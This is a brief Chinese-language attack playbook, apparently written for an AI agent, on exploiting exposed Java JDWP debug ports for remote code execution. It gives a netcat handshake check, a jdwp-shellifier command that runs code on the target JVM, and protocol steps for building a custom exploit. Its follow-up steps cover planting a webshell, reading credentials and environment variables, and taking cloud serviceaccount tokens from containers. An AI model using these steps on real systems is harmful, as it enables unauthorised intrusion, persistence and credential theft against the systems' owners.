# 卡:JDWP 调试端口 RCE(Java)

**指纹**:端口 5005/8000/其它非常规端口开放;进程命令行带 `-agentlib:jdwp=transport=dt_socket`;
nmap 服务识别出现 `jdwp`;Java 应用响应异常但服务在跑。

## 最短路径
```bash
# 1) 确认是 JDWP(握手:发 "JDWP-Handshake",回相同串即命中)
printf 'JDWP-Handshake' | nc -w 3 <ip> <port>
# 2) 用现成工具直接在目标 JVM 里执行代码(本机/工具机上都可跑)
python3 jdwp-shellifier.py -t <ip> -p <port> --cmd "id"          # 公开工具,若本机没有可自己实现
# 3) 拿到命令执行后:优先"带内回显"(写 Web 目录/回显在响应里),别反弹 shell
```
自实现要点(Hans-Martin 的 JDWP 协议):握手 → `VirtualMachine.IDSizes` → 拿 `ClassReference`(java.lang.Runtime)
→ `Method`(`getRuntime` / `exec`)→ `ObjectReference.InvokeMethod` 传字符串数组。**写脚本算,不要在 thinking 里手推协议。**

## 边界
- JDWP 只能执行**单次**命令调用时,先用它落一个 webshell 或读环境变量/凭据,再走 Web 面;
- 若目标是容器内 JVM:可读 `/proc/self/environ`、挂载的 `serviceaccount` token(云环境)按"云侧卡"继续。
